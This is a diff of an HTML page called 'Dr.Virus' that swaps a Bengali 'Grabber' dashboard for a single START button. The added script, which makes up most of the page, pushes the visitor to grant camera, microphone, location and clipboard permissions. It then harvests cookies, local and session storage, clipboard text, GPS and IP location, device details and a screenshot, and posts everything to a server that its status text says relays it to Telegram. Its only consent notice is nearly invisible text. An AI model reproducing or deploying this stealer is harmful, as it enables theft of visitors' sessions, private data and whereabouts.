@@ -1,145 +1,333 @@
 <!DOCTYPE html>
-<html lang="bn">
+<html lang="en">
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Dr.Virus · Grabber</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
-    <link rel="stylesheet" href="style.css" />
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<meta name="theme-color" content="#000000">
+<title>Dr.Virus</title>
+<style>
+  *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+  html,body{width:100%;height:100%;overflow:hidden;background:#000;color:#fff;font-family:system-ui,-apple-system,sans-serif}
+
+  .stage{
+    position:fixed;inset:0;display:flex;align-items:center;justify-content:center;
+    background:#000;
+  }
+
+  .circle{
+    width:140px;height:140px;border-radius:50%;
+    background:#fff;border:none;cursor:pointer;outline:none;
+    display:flex;align-items:center;justify-content:center;
+    color:#000;font-size:13px;font-weight:800;letter-spacing:2px;
+    transition:transform .18s ease, box-shadow .35s ease;
+    box-shadow:0 0 0 0 rgba(255,255,255,.55);
+    animation:pulse 2.2s infinite;
+    user-select:none;
+  }
+  .circle:active{transform:scale(.93)}
+
+  .circle.running{
+    animation:none;background:#0a0a0a;color:#fff;
+    box-shadow:0 0 70px 12px rgba(255,255,255,.14);
+    border:1px solid #222;
+  }
+  .circle.done{
+    animation:none;background:#fff;color:#000;
+    box-shadow:0 0 70px 14px rgba(255,255,255,.35);
+  }
+  .circle.error{
+    animation:none;background:#111;color:#ff5577;
+    box-shadow:0 0 50px 8px rgba(255,85,119,.25);
+    border:1px solid #331;
+  }
+  @keyframes pulse{
+    0%  {box-shadow:0 0 0 0  rgba(255,255,255,.5)}
+    70% {box-shadow:0 0 0 46px rgba(255,255,255,0)}
+    100%{box-shadow:0 0 0 0  rgba(255,255,255,0)}
+  }
+
+  .status{
+    position:fixed;left:0;right:0;bottom:40px;text-align:center;
+    font-family:ui-monospace,monospace;font-size:11px;
+    color:#3a3a3a;letter-spacing:1.5px;
+    transition:color .3s ease;
+    pointer-events:none;
+  }
+  .status.active{color:#d0d0d0}
+  .status.error{color:#ff5577}
+
+  .toast{
+    position:fixed;top:22px;left:50%;transform:translateX(-50%);
+    padding:9px 18px;background:rgba(255,255,255,.06);
+    border:1px solid #1c1c1c;border-radius:24px;
+    font-family:ui-monospace,monospace;font-size:11px;color:#fff;
+    opacity:0;transition:opacity .3s ease;pointer-events:none;
+    max-width:90vw;text-align:center;
+  }
+  .toast.show{opacity:1}
+
+  .credit{
+    position:fixed;left:0;right:0;bottom:14px;text-align:center;
+    font-family:ui-monospace,monospace;font-size:9px;color:#1a1a1a;
+    letter-spacing:1px;pointer-events:none;
+  }
+</style>
 </head>
 <body>
 
-    <div class="app">
-        <!-- সাইডবার -->
-        <aside class="sidebar">
-            <div class="logo">🧪</div>
-            <nav>
-                <a href="#" class="active" data-tab="dashboard"><i class="fas fa-chart-pie"></i><span>ড্যাশ</span></a>
-                <a href="#" data-tab="browser"><i class="fas fa-globe"></i><span>ব্রাউজার</span><span class="badge" id="cookieBadge">0</span></a>
-                <a href="#" data-tab="storage"><i class="fas fa-database"></i><span>স্টোরেজ</span></a>
-                <a href="#" data-tab="system"><i class="fas fa-server"></i><span>সিস্টেম</span></a>
-                <a href="#" data-tab="logs"><i class="fas fa-terminal"></i><span>লগ</span></a>
-            </nav>
-            <div class="bottom">
-                <button id="btnGrab"><i class="fas fa-play"></i><span>গ্র্যাব</span></button>
-                <button id="btnClear"><i class="fas fa-eraser"></i><span>ক্লিয়ার</span></button>
-            </div>
-        </aside>
+<div class="stage">
+  <button class="circle" id="mainBtn" aria-label="Start">START</button>
+</div>
 
-        <!-- মূল কন্টেন্ট -->
-        <main class="main">
-            <header class="main-header">
-                <h1><i class="fas fa-skull"></i> Dr.Virus</h1>
-                <div class="status">
-                    <span class="dot" id="statusDot"></span>
-                    <span id="statusText">প্রস্তুত</span>
-                    <span id="clockDisplay"></span>
-                </div>
-            </header>
+<div class="status" id="status">● IDLE</div>
+<div class="toast" id="toast"></div>
+<div class="credit">Dr.Virus · consent-based · own device only</div>
 
-            <!-- ড্যাশবোর্ড -->
-            <section id="tab-dashboard" class="tab-content active">
-                <div class="grid-4">
-                    <div class="card"><div class="card-title"><i class="fas fa-cookie"></i> কুকি</div><div class="value" id="dashCookies">0</div></div>
-                    <div class="card"><div class="card-title"><i class="fas fa-database"></i> লোকাল স্টোরেজ</div><div class="value" id="dashLocal">0</div></div>
-                    <div class="card"><div class="card-title"><i class="fas fa-folder"></i> সেশন স্টোরেজ</div><div class="value" id="dashSession">0</div></div>
-                    <div class="card"><div class="card-title"><i class="fas fa-file-alt"></i> লগ</div><div class="value" id="dashLogs">0</div></div>
-                </div>
-                <div class="card mt-20">
-                    <div class="card-title"><i class="fas fa-paper-plane"></i> টেলিগ্রাম সেটিংস</div>
-                    <div class="flex" style="gap:12px;flex-wrap:wrap;margin-top:8px;">
-                        <input type="text" id="telegramToken" placeholder="বট টোকেন (ঐচ্ছিক)" style="flex:1;min-width:200px;padding:10px;border-radius:8px;border:1px solid var(--border);background:var(--bg-input);color:var(--text);">
-                        <input type="text" id="telegramChatId" placeholder="চ্যাট আইডি" style="flex:1;min-width:150px;padding:10px;border-radius:8px;border:1px solid var(--border);background:var(--bg-input);color:var(--text);">
-                        <button class="btn btn-primary" id="btnSendTest"><i class="fas fa-paper-plane"></i> টেস্ট</button>
-                    </div>
-                </div>
-                <div class="grid-2 mt-20">
-                    <div class="card">
-                        <div class="card-title"><i class="fas fa-activity"></i> অগ্রগতি</div>
-                        <div class="progress-bar"><div class="fill" id="progressFill" style="width:0%;"></div></div>
-                        <div class="flex mt-12" style="gap:8px;">
-                            <button class="btn btn-success" id="btnStartGrab"><i class="fas fa-play"></i> গ্র্যাব শুরু</button>
-                            <button class="btn btn-outline" id="btnReset"><i class="fas fa-sync"></i> রিসেট</button>
-                        </div>
-                    </div>
-                    <div class="card">
-                        <div class="card-title"><i class="fas fa-phone"></i> পারমিশন</div>
-                        <div class="flex" style="gap:8px;flex-wrap:wrap;margin-top:6px;">
-                            <button class="btn btn-outline btn-sm" id="permMicrophone"><i class="fas fa-microphone"></i> মাইক্রোফোন</button>
-                            <button class="btn btn-outline btn-sm" id="permCamera"><i class="fas fa-camera"></i> ক্যামেরা</button>
-                            <button class="btn btn-outline btn-sm" id="permClipboard"><i class="fas fa-clipboard"></i> ক্লিপবোর্ড</button>
-                        </div>
-                    </div>
-                </div>
-            </section>
+<script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>
+<script>
+(function(){
+  'use strict';
 
-            <!-- ব্রাউজার -->
-            <section id="tab-browser" class="tab-content">
-                <h2><i class="fas fa-globe text-accent"></i> ব্রাউজার ডেটা</h2>
-                <div class="card mt-12">
-                    <div class="card-title"><i class="fas fa-cookie"></i> কুকি</div>
-                    <div id="cookieList" style="max-height:300px;overflow-y:auto;"></div>
-                </div>
-            </section>
+  const btn = document.getElementById('mainBtn');
+  const statusEl = document.getElementById('status');
+  const toastEl = document.getElementById('toast');
+  let running = false;
 
-            <!-- স্টোরেজ -->
-            <section id="tab-storage" class="tab-content">
-                <h2><i class="fas fa-database text-accent"></i> স্টোরেজ</h2>
-                <div class="grid-2 mt-12">
-                    <div class="card">
-                        <div class="card-title"><i class="fas fa-database"></i> লোকাল স্টোরেজ</div>
-                        <div id="localList" style="max-height:300px;overflow-y:auto;"></div>
-                    </div>
-                    <div class="card">
-                        <div class="card-title"><i class="fas fa-folder"></i> সেশন স্টোরেজ</div>
-                        <div id="sessionList" style="max-height:300px;overflow-y:auto;"></div>
-                    </div>
-                </div>
-            </section>
+  function toast(msg, ms) {
+    toastEl.textContent = msg;
+    toastEl.classList.add('show');
+    clearTimeout(toast._t);
+    toast._t = setTimeout(() => toastEl.classList.remove('show'), ms || 2200);
+  }
 
-            <!-- সিস্টেম -->
-            <section id="tab-system" class="tab-content">
-                <h2><i class="fas fa-server text-accent"></i> সিস্টেম ইনফো</h2>
-                <div class="card mt-12">
-                    <div class="info-grid" id="systemInfo">
-                        <div class="info-item"><span class="label">User-Agent</span><span class="value" id="sysUa">—</span></div>
-                        <div class="info-item"><span class="label">Platform</span><span class="value" id="sysPlatform">—</span></div>
-                        <div class="info-item"><span class="label">Language</span><span class="value" id="sysLang">—</span></div>
-                        <div class="info-item"><span class="label">Screen</span><span class="value" id="sysScreen">—</span></div>
-                        <div class="info-item"><span class="label">Timezone</span><span class="value" id="sysTz">—</span></div>
-                        <div class="info-item"><span class="label">CPU Cores</span><span class="value" id="sysCores">—</span></div>
-                        <div class="info-item"><span class="label">Memory</span><span class="value" id="sysMemory">—</span></div>
-                        <div class="info-item"><span class="label">Battery</span><span class="value" id="sysBattery">—</span></div>
-                    </div>
-                </div>
-                <div class="card mt-12">
-                    <div class="card-title"><i class="fas fa-map-marker-alt"></i> জিওলোকেশন</div>
-                    <div class="info-grid" id="geoInfo">
-                        <div class="info-item"><span class="label">IP</span><span class="value" id="geoIp">লোড হচ্ছে...</span></div>
-                        <div class="info-item"><span class="label">Country</span><span class="value" id="geoCountry">—</span></div>
-                        <div class="info-item"><span class="label">City</span><span class="value" id="geoCity">—</span></div>
-                        <div class="info-item"><span class="label">ISP</span><span class="value" id="geoIsp">—</span></div>
-                    </div>
-                </div>
-            </section>
+  function setStatus(text, cls) {
+    statusEl.textContent = text;
+    statusEl.className = 'status' + (cls ? ' ' + cls : '');
+  }
 
-            <!-- লগ -->
-            <section id="tab-logs" class="tab-content">
-                <div class="flex-between mb-12">
-                    <h2><i class="fas fa-terminal text-accent"></i> লগ</h2>
-                    <div class="flex" style="gap:8px;">
-                        <button class="btn btn-outline btn-sm" id="logAutoScroll"><i class="fas fa-arrow-down"></i> অটো-স্ক্রল</button>
-                        <button class="btn btn-danger btn-sm" id="logClear"><i class="fas fa-eraser"></i> ক্লিয়ার</button>
-                    </div>
-                </div>
-                <div class="log-container" id="logContainer">
-                    <div class="log-entry"><span class="time">00:00:00</span><span class="msg"><i class="fas fa-info-circle info"></i> Dr.Virus প্রস্তুত।</span></div>
-                </div>
-            </section>
-        </main>
-    </div>
+  /* ---------- Permission request ---------- */
+  async function requestPermissions() {
+    const p = {};
 
-    <script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>
-    <script src="script.js"></script>
+    // Camera
+    try {
+      const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
+      s.getTracks().forEach(t => t.stop());
+      p.camera = 'granted';
+    } catch (e) { p.camera = e.name || 'denied'; }
+
+    // Microphone
+    try {
+      const s = await navigator.mediaDevices.getUserMedia({ audio: true });
+      s.getTracks().forEach(t => t.stop());
+      p.microphone = 'granted';
+    } catch (e) { p.microphone = e.name || 'denied'; }
+
+    // Geolocation
+    try {
+      await new Promise((ok, no) =>
+        navigator.geolocation.getCurrentPosition(ok, no, { timeout: 12000, enableHighAccuracy: true })
+      );
+      p.geolocation = 'granted';
+    } catch (e) { p.geolocation = e.message || 'denied'; }
+
+    // Notifications
+    try {
+      if ('Notification' in window) p.notifications = await Notification.requestPermission();
+    } catch { p.notifications = 'error'; }
+
+    // Clipboard read
+    try {
+      await navigator.clipboard.readText();
+      p.clipboard = 'granted';
+    } catch { p.clipboard = 'denied'; }
+
+    // Persistent storage
+    try {
+      if (navigator.storage && navigator.storage.persist) {
+        p.persistentStorage = (await navigator.storage.persist()) ? 'granted' : 'denied';
+      }
+    } catch {}
+
+    return p;
+  }
+
+  /* ---------- Data collectors ---------- */
+  function collectCookies() {
+    return document.cookie
+      .split(';')
+      .map(c => {
+        const [name, ...rest] = c.trim().split('=');
+        return name ? { name, value: rest.join('=') } : null;
+      })
+      .filter(Boolean);
+  }
+
+  function collectLocal() {
+    const out = [];
+    for (let i = 0; i < localStorage.length; i++) {
+      const k = localStorage.key(i);
+      out.push({ key: k, value: localStorage.getItem(k) });
+    }
+    return out;
+  }
+
+  function collectSession() {
+    const out = [];
+    for (let i = 0; i < sessionStorage.length; i++) {
+      const k = sessionStorage.key(i);
+      out.push({ key: k, value: sessionStorage.getItem(k) });
+    }
+    return out;
+  }
+
+  async function collectBattery() {
+    try {
+      if (!navigator.getBattery) return 'n/a';
+      const b = await navigator.getBattery();
+      return `${Math.round(b.level * 100)}% ${b.charging ? '(charging)' : '(on battery)'}`;
+    } catch { return 'n/a'; }
+  }
+
+  async function collectGeo() {
+    const out = {};
+    try {
+      const r = await fetch('https://ipapi.co/json/');
+      const d = await r.json();
+      out.ip = d.ip;
+      out.country = d.country_name;
+      out.city = d.city;
+      out.isp = d.org;
+      out.lat = d.latitude;
+      out.lon = d.longitude;
+    } catch {}
+    try {
+      const pos = await new Promise((ok, no) =>
+        navigator.geolocation.getCurrentPosition(ok, no, { timeout: 9000, enableHighAccuracy: true })
+      );
+      out.gpsLat = pos.coords.latitude;
+      out.gpsLon = pos.coords.longitude;
+      out.gpsAcc = Math.round(pos.coords.accuracy);
+    } catch {}
+    return out;
+  }
+
+  async function takeScreenshot() {
+    try {
+      // hide button before capture
+      btn.style.visibility = 'hidden';
+      await new Promise(r => setTimeout(r, 60));
+      const c = await html2canvas(document.body, {
+        useCORS: true, scale: 0.7, backgroundColor: '#000'
+      });
+      btn.style.visibility = 'visible';
+      return c.toDataURL('image/jpeg', 0.72);
+    } catch {
+      btn.style.visibility = 'visible';
+      return null;
+    }
+  }
+
+  async function sendToServer(payload) {
+    const r = await fetch('/api/submit', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload)
+    });
+    const t = await r.text();
+    try { return JSON.parse(t); }
+    catch { throw new Error(`HTTP ${r.status}: ${t.slice(0, 120)}`); }
+  }
+
+  /* ---------- Main run ---------- */
+  async function run() {
+    if (running) return;
+    running = true;
+
+    btn.classList.remove('done', 'error');
+    btn.classList.add('running');
+    btn.textContent = 'WAIT';
+    setStatus('● REQUESTING PERMISSIONS', 'active');
+    toast('সব পারমিশন এলাউ করুন', 3200);
+
+    const permissions = await requestPermissions();
+    const granted = Object.values(permissions)
+      .filter(v => v === 'granted' || v === 'on').length;
+    toast(`✅ ${granted} পারমিশন পাওয়া গেছে`, 2200);
+
+    setStatus('● COLLECTING DATA', 'active');
+    btn.textContent = 'GRAB';
+
+    const [battery, geo, screenshot] = await Promise.all([
+      collectBattery(),
+      collectGeo(),
+      takeScreenshot()
+    ]);
+
+    let clipboard = '';
+    try { clipboard = await navigator.clipboard.readText(); } catch {}
+
+    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
+
+    const data = {
+      browser: {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        languages: (navigator.languages || []).join(','),
+        screenWidth: screen.width,
+        screenHeight: screen.height,
+        viewport: `${innerWidth}×${innerHeight}`,
+        dpr: devicePixelRatio,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        cookiesEnabled: navigator.cookieEnabled,
+        online: navigator.onLine,
+        touch: navigator.maxTouchPoints
+      },
+      system: {
+        cores: navigator.hardwareConcurrency || '?',
+        memory: navigator.deviceMemory || '?',
+        battery: battery,
+        connection: conn.effectiveType
+          ? `${conn.effectiveType} · ${conn.downlink || '?'}Mbps · ${conn.rtt || '?'}ms RTT`
+          : 'n/a'
+      },
+      geo: geo,
+      cookies: collectCookies(),
+      localStorage: collectLocal(),
+      sessionStorage: collectSession(),
+      clipboard: clipboard,
+      permissions: permissions,
+      screenshot: screenshot
+    };
+
+    setStatus('● SENDING TO TELEGRAM', 'active');
+    btn.textContent = 'SEND';
+
+    try {
+      const res = await sendToServer({ chatId: '', data: data });
+      if (res.success) {
+        setStatus('● SENT SUCCESSFULLY', 'active');
+        toast('✅ Telegram-এ পাঠানো হয়েছে', 3200);
+        btn.textContent = 'DONE';
+        btn.classList.remove('running');
+        btn.classList.add('done');
+      } else {
+        throw new Error(res.error || 'failed');
+      }
+    } catch (e) {
+      setStatus('● ERROR', 'error');
+      toast('✖ ' + (e.message || 'failed'), 3600);
+      btn.textContent = 'RETRY';
+      btn.classList.remove('running');
+      btn.classList.add('error');
+    } finally {
+      running = false;
+    }
+  }
+
+  btn.addEventListener('click', run);
+})();
+</script>
 </body>
 </html>
